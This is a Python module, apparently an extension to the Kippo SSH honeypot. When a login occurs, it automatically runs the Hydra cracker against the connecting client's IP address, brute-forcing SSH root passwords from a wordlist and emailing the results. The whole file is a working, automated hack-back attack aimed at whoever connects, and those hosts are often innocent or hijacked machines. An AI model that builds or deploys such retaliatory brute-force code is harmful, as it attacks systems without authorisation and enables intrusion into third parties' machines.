import subprocess
import threading
from kippo.core.config import config
from kippo.core.sendemail import sendEmail

class Bruteforce(object):
    def __init__(self, clientip):
        self.clientip = clientip
        
        performBruteforce = config().getboolean('dirtybastard',  'bruteforce_ssh_on_login')
        
        if performBruteforce:
            threading.Thread(target=self.bruteforceThread).start()

    def bruteforceThread(self):
        print "Launching Hydra at %s." % (self.clientip)
        
        cfg = config()
        hydraLocation = cfg.get('dirtybastard',  'hydra_location')
        listLocation = cfg.get('dirtybastard',  'password_list')
        
        if not self.doesFileExist(hydraLocation):
            print "Unable to find Hydra at given location: %s.\nAborting bruteforce." % (hydraLocation)
            return
        
        if not self.doesFileExist(listLocation):
            print "Unable to find password list at: %s.\nAborting bruteforce." % (listLocation)
            return
        
        cmd = [hydraLocation, self.clientip, "ssh", "-l", "root", "-P" , listLocation]

        p = subprocess.Popen(cmd,  stdout=subprocess.PIPE)
        
        out, err = p.communicate()
        
        print "Hydra complete (%s)." % (self.clientip)
        print "stdout:", out
        
        sendEmail('Hydra results ' + self.clientip,  out)
        
    def doesFileExist(self,  file):
        try:
           with open(file): pass
        except IOError:
           return False
        
        return True
